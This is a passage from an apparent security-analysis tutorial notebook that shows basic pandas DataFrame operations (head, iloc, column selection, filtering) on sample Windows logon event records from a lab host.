<tr>\n      <th>4</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:14.453</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>117.82.191.160</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>5</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 04:28:33.090</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xf0c9d6</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>6</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 03:21:49.617</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>117.82.191.160</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>7</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 03:21:51.957</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>80.89.137.214</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>8</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 02:45:49.393</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>80.89.137.214</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>9</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 02:45:51.727</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>80.89.137.214</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>10</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 01:42:28.340</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>11</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 01:45:23.610</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>12</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 03:09:49.353</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>13</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 03:09:51.707</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>-</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                                TenantId                        Account  \\\n0   802d39e1-9d70-404d-832c-2de5e2478eda     MSTICAlertsWin1\\MSTICAdmin   \n1   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n2   802d39e1-9d70-404d-832c-2de5e2478eda  MSTICAlertsWin1\\adm1nistrator   \n3   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n4   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n5   802d39e1-9d70-404d-832c-2de5e2478eda     MSTICAlertsWin1\\MSTICAdmin   \n6   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n7   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n8   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n9   802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n10  802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n11  802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n12  802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n13  802d39e1-9d70-404d-832c-2de5e2478eda            NT AUTHORITY\\SYSTEM   \n\n    EventID            TimeGenerated                      SourceComputerId  \\\n0      4624  2019-01-15 05:15:02.980  46fe7078-61bb-4bed-9430-7ac01d91c273   \n1      4624  2019-01-15 05:15:04.503  46fe7078-61bb-4bed-9430-7ac01d91c273   \n2      4624  2019-01-15 05:15:06.363  46fe7078-61bb-4bed-9430-7ac01d91c273   \n3      4624  2019-01-15 05:15:10.813  46fe7078-61bb-4bed-9430-7ac01d91c273   \n4      4624  2019-01-15 05:15:14.453  46fe7078-61bb-4bed-9430-7ac01d91c273   \n5      4624  2019-01-15 04:28:33.090  46fe7078-61bb-4bed-9430-7ac01d91c273   \n6      4624  2019-01-15 03:21:49.617  46fe7078-61bb-4bed-9430-7ac01d91c273   \n7      4624  2019-01-15 03:21:51.957  46fe7078-61bb-4bed-9430-7ac01d91c273   \n8      4624  2019-01-15 02:45:49.393  46fe7078-61bb-4bed-9430-7ac01d91c273   \n9      4624  2019-01-15 02:45:51.727  46fe7078-61bb-4bed-9430-7ac01d91c273   \n10     4624  2019-01-15 01:42:28.340  46fe7078-61bb-4bed-9430-7ac01d91c273   \n11     4624  2019-01-15 01:45:23.610  46fe7078-61bb-4bed-9430-7ac01d91c273   \n12     4624  2019-01-15 03:09:49.353  46fe7078-61bb-4bed-9430-7ac01d91c273   \n13     4624  2019-01-15 03:09:51.707  46fe7078-61bb-4bed-9430-7ac01d91c273   \n\n           Computer   SubjectUserName SubjectDomainName SubjectUserSid  \\\n0   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n1   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n2   MSTICAlertsWin1                 -                 -        S-1-0-0   \n3   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n4   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n5   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n6   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n7   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n8   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n9   MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n10  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n11  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n12  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n13  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n\n   TargetUserName TargetDomainName  \\\n0      MSTICAdmin  MSTICAlertsWin1   \n1          SYSTEM     NT AUTHORITY   \n2   adm1nistrator  MSTICAlertsWin1   \n3          SYSTEM     NT AUTHORITY   \n4          SYSTEM     NT AUTHORITY   \n5      MSTICAdmin  MSTICAlertsWin1   \n6          SYSTEM     NT AUTHORITY   \n7          SYSTEM     NT AUTHORITY   \n8          SYSTEM     NT AUTHORITY   \n9          SYSTEM     NT AUTHORITY   \n10         SYSTEM     NT AUTHORITY   \n11         SYSTEM     NT AUTHORITY   \n12         SYSTEM     NT AUTHORITY   \n13         SYSTEM     NT AUTHORITY   \n\n                                    TargetUserSid TargetLogonId  \\\n0    S-1-5-21-996632719-2361334927-4038480536-500      0xfaac27   \n1                                        S-1-5-18         0x3e7   \n2   S-1-5-21-996632719-2361334927-4038480536-1066      0xfb5ee6   \n3                                        S-1-5-18         0x3e7   \n4                                        S-1-5-18         0x3e7   \n5    S-1-5-21-996632719-2361334927-4038480536-500      0xf0c9d6   \n6                                        S-1-5-18         0x3e7   \n7                                        S-1-5-18         0x3e7   \n8                                        S-1-5-18         0x3e7   \n9                                        S-1-5-18         0x3e7   \n10                                       S-1-5-18         0x3e7   \n11                                       S-1-5-18         0x3e7   \n12                                       S-1-5-18         0x3e7   \n13                                       S-1-5-18         0x3e7   \n\n   LogonProcessName  LogonType AuthenticationPackageName  Status  \\\n0          Advapi            4                 Negotiate     NaN   \n1          Advapi            5                 Negotiate     NaN   \n2          NtLmSsp           3                      NTLM     NaN   \n3          Advapi            5                 Negotiate     NaN   \n4          Advapi            5                 Negotiate     NaN   \n5          Advapi            4                 Negotiate     NaN   \n6          Advapi            5                 Negotiate     NaN   \n7          Advapi            5                 Negotiate     NaN   \n8          Advapi            5                 Negotiate     NaN   \n9          Advapi            5                 Negotiate     NaN   \n10         Advapi            5                 Negotiate     NaN   \n11         Advapi            5                 Negotiate     NaN   \n12         Advapi            5                 Negotiate     NaN   \n13         Advapi            5                 Negotiate     NaN   \n\n                    IpAddress  WorkstationName  \n0              203.160.71.100  MSTICAlertsWin1  \n1              203.160.71.100                -  \n2   fe80::38dc:e4a9:61bd:b458  MSTICAlertsWin1  \n3              203.160.71.100                -  \n4              117.82.191.160                -  \n5                           -  MSTICAlertsWin1  \n6              117.82.191.160                -  \n7               80.89.137.214                -  \n8               80.89.137.214                -  \n9               80.89.137.214                -  \n10             203.160.71.100                -  \n11             203.160.71.100                -  \n12             203.160.71.100                -  \n13             203.160.71.100                -  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "> **Note** if the dataframe variable (`df` in the example above) is the last statement in a \n> code cell, Jupyter will automatically display it without using the `display()` function. \n> However, if you want to display a DataFrame in the middle of \n> other code in a cell you must use the `display()` function.\n\nYou may not want to display the whole DataFrame and instead display only a selection of items. There are numerous ways to do this and the cell below shows some of the most widely used functions."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "md(\"Display the first 2 rows using head(): \", \"bold\")\ndisplay(df.head(2))  # we don't need to call display here but just for illustration",
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style='font-weight: bold'>Display the first 2 rows using head(): </p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>Account</th>\n      <th>EventID</th>\n      <th>TimeGenerated</th>\n      <th>SourceComputerId</th>\n      <th>Computer</th>\n      <th>SubjectUserName</th>\n      <th>SubjectDomainName</th>\n      <th>SubjectUserSid</th>\n      <th>TargetUserName</th>\n      <th>TargetDomainName</th>\n      <th>TargetUserSid</th>\n      <th>TargetLogonId</th>\n      <th>LogonProcessName</th>\n      <th>LogonType</th>\n      <th>AuthenticationPackageName</th>\n      <th>Status</th>\n      <th>IpAddress</th>\n      <th>WorkstationName</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xfaac27</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:04.503</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>-</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                               TenantId                     Account  EventID  \\\n0  802d39e1-9d70-404d-832c-2de5e2478eda  MSTICAlertsWin1\\MSTICAdmin     4624   \n1  802d39e1-9d70-404d-832c-2de5e2478eda         NT AUTHORITY\\SYSTEM     4624   \n\n             TimeGenerated                      SourceComputerId  \\\n0  2019-01-15 05:15:02.980  46fe7078-61bb-4bed-9430-7ac01d91c273   \n1  2019-01-15 05:15:04.503  46fe7078-61bb-4bed-9430-7ac01d91c273   \n\n          Computer   SubjectUserName SubjectDomainName SubjectUserSid  \\\n0  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n1  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n\n  TargetUserName TargetDomainName  \\\n0     MSTICAdmin  MSTICAlertsWin1   \n1         SYSTEM     NT AUTHORITY   \n\n                                  TargetUserSid TargetLogonId  \\\n0  S-1-5-21-996632719-2361334927-4038480536-500      0xfaac27   \n1                                      S-1-5-18         0x3e7   \n\n  LogonProcessName  LogonType AuthenticationPackageName  Status IpAddress  \\\n0         Advapi            4                 Negotiate     NaN         -   \n1         Advapi            5                 Negotiate     NaN         -   \n\n   WorkstationName  \n0  MSTICAlertsWin1  \n1                -  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "md(\"Display the 3rd row using iloc[]: \", \"bold\")\ndf.iloc[3]",
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style='font-weight: bold'>Display the 3rd row using iloc[]: </p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 26,
          "data": {
            "text/plain": "TenantId                     802d39e1-9d70-404d-832c-2de5e2478eda\nAccount                                       NT AUTHORITY\\SYSTEM\nEventID                                                      4624\nTimeGenerated                             2019-01-15 05:15:10.813\nSourceComputerId             46fe7078-61bb-4bed-9430-7ac01d91c273\nComputer                                          MSTICAlertsWin1\nSubjectUserName                                  MSTICAlertsWin1$\nSubjectDomainName                                       WORKGROUP\nSubjectUserSid                                           S-1-5-18\nTargetUserName                                             SYSTEM\nTargetDomainName                                     NT AUTHORITY\nTargetUserSid                                            S-1-5-18\nTargetLogonId                                               0x3e7\nLogonProcessName                                         Advapi  \nLogonType                                                       5\nAuthenticationPackageName                               Negotiate\nStatus                                                        NaN\nIpAddress                                                       -\nWorkstationName                                                 -\nName: 3, dtype: object"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "md(\"Show the column names in the DataFrame \", \"bold\")\ndf.columns",
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style='font-weight: bold'>Show the column names in the DataFrame </p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 27,
          "data": {
            "text/plain": "Index(['TenantId', 'Account', 'EventID', 'TimeGenerated', 'SourceComputerId',\n       'Computer', 'SubjectUserName', 'SubjectDomainName', 'SubjectUserSid',\n       'TargetUserName', 'TargetDomainName', 'TargetUserSid', 'TargetLogonId',\n       'LogonProcessName', 'LogonType', 'AuthenticationPackageName', 'Status',\n       'IpAddress', 'WorkstationName'],\n      dtype='object')"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "md(\"Display just the TimeGenerated and TenantId columnns: \", \"bold\")\ndf[[\"TimeGenerated\", \"TenantId\"]]",
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style='font-weight: bold'>Display just the TimeGenerated and TenantId columnns: </p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 28,
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TimeGenerated</th>\n      <th>TenantId</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>2019-01-15 05:15:04.503</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>2019-01-15 05:15:06.363</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>2019-01-15 05:15:10.813</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>4</th>\n      <td>2019-01-15 05:15:14.453</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>5</th>\n      <td>2019-01-15 04:28:33.090</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>6</th>\n      <td>2019-01-15 03:21:49.617</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>7</th>\n      <td>2019-01-15 03:21:51.957</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>8</th>\n      <td>2019-01-15 02:45:49.393</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>9</th>\n      <td>2019-01-15 02:45:51.727</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>10</th>\n      <td>2019-01-15 01:42:28.340</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>11</th>\n      <td>2019-01-15 01:45:23.610</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>12</th>\n      <td>2019-01-15 03:09:49.353</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n    <tr>\n      <th>13</th>\n      <td>2019-01-15 03:09:51.707</td>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "              TimeGenerated                              TenantId\n0   2019-01-15 05:15:02.980  802d39e1-9d70-404d-832c-2de5e2478eda\n1   2019-01-15 05:15:04.503  802d39e1-9d70-404d-832c-2de5e2478eda\n2   2019-01-15 05:15:06.363  802d39e1-9d70-404d-832c-2de5e2478eda\n3   2019-01-15 05:15:10.813  802d39e1-9d70-404d-832c-2de5e2478eda\n4   2019-01-15 05:15:14.453  802d39e1-9d70-404d-832c-2de5e2478eda\n5   2019-01-15 04:28:33.090  802d39e1-9d70-404d-832c-2de5e2478eda\n6   2019-01-15 03:21:49.617  802d39e1-9d70-404d-832c-2de5e2478eda\n7   2019-01-15 03:21:51.957  802d39e1-9d70-404d-832c-2de5e2478eda\n8   2019-01-15 02:45:49.393  802d39e1-9d70-404d-832c-2de5e2478eda\n9   2019-01-15 02:45:51.727  802d39e1-9d70-404d-832c-2de5e2478eda\n10  2019-01-15 01:42:28.340  802d39e1-9d70-404d-832c-2de5e2478eda\n11  2019-01-15 01:45:23.610  802d39e1-9d70-404d-832c-2de5e2478eda\n12  2019-01-15 03:09:49.353  802d39e1-9d70-404d-832c-2de5e2478eda\n13  2019-01-15 03:09:51.707  802d39e1-9d70-404d-832c-2de5e2478eda"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "md(\"Display only rows where TargetUserName value is 'MSTICAdmin': \", \"bold\")\ndf[df['TargetUserName']==\"MSTICAdmin\"]",
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style='font-weight: bold'>Display only rows where TargetUserName value is 'MSTICAdmin': </p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 29,
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>Account</th>\n      <th>EventID</th>\n      <th>TimeGenerated</th>\n      <th>SourceComputerId</th>\n      <th>Computer</th>\n      <th>SubjectUserName</th>\n      <th>SubjectDomainName</th>\n      <th>SubjectUserSid</th>\n      <th>TargetUserName</th>\n      <th>TargetDomainName</th>\n      <th>TargetUserSid</th>\n      <th>TargetLogonId</th>\n      <th>LogonProcessName</th>\n      <th>LogonType</th>\n      <th>AuthenticationPackageName</th>\n      <th>Status</th>\n      <th>IpAddress</th>\n      <th>WorkstationName</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xfaac27</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>5</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 04:28:33.090</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xf0c9d6</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                               TenantId                     Account  EventID  \\\n0  802d39e1-9d70-404d-832c-2de5e2478eda  MSTICAlertsWin1\\MSTICAdmin     4624   \n5  802d39e1-9d70-404d-832c-2de5e2478eda  MSTICAlertsWin1\\MSTICAdmin     4624   \n\n             TimeGenerated                      SourceComputerId  \\\n0  2019-01-15 05:15:02.980  46fe7078-61bb-4bed-9430-7ac01d91c273   \n5  2019-01-15 04:28:33.090  46fe7078-61bb-4bed-9430-7ac01d91c273   \n\n          Computer   SubjectUserName SubjectDomainName SubjectUserSid  \\\n0  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n5  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n\n  TargetUserName TargetDomainName  \\\n0     MSTICAdmin  MSTICAlertsWin1   \n5     MSTICAdmin  MSTICAlertsWin1   \n\n                                  TargetUserSid TargetLogonId  \\\n0  S-1-5-21-996632719-2361334927-4038480536-500      0xfaac27   \n5  S-1-5-21-996632719-2361334927-4038480536-500      0xf0c9d6   \n\n  LogonProcessName  LogonType AuthenticationPackageName  Status IpAddress  \\\n0         Advapi            4                 Negotiate     NaN         -   \n5         Advapi            4                 Negotiate     NaN         -   \n\n   WorkstationName  \n0  MSTICAlertsWin1  \n5  MSTICAlertsWin1  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
